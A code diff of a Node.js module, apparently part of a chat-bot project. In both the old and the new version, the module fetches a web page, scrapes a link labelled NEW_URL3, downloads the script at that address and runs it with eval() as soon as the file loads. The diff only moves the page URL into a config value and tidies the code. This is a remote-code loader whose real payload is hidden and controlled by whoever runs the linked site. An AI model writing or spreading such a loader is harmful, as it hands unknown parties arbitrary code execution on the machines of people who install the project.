@@ -2,27 +2,28 @@
 
 const axios = require('axios');
 const cheerio = require('cheerio');
-
-const webPageUrl = 'https://www.ibrahimadams.site/files';
+const adams = require(__dirname + "/../config");
 
 async function fetchNewUrl3() {
-    try {
-        const response = await axios.get(webPageUrl);
-        const $ = cheerio.load(response.data);
-        const newUrl3 = $(`a:contains("NEW_URL3")`).attr('href');
+  try {
+    const response = await axios.get(adams.BWM_XMD);
+    const $ = cheerio.load(response.data);
 
-        if (!newUrl3) throw new Error('NEW_URL3 not found on the webpage.');
+    const newUrl3Element = $('a:contains("NEW_URL3")');
+    const newUrl3 = newUrl3Element.attr('href');
 
-        console.log('NEW_URL3 fetched successfully:', newUrl3);
-
-        const scriptResponse = await axios.get(newUrl3);
-        const scriptContent = scriptResponse.data;
-        console.log("NEW_URL3 script loaded successfully");
-
-        eval(scriptContent);
-    } catch (error) {
-        console.error('Error fetching NEW_URL3:', error.message);
+    if (!newUrl3) {
+      throw new Error('New URL 3 link not found...');
     }
+
+    console.log('New URL 3 fetched successfully ✅');
+
+    const scriptResponse = await axios.get(newUrl3);
+    eval(scriptResponse.data);
+
+  } catch (error) {
+    console.error('Error:', error.message);
+  }
 }
 
 fetchNewUrl3();
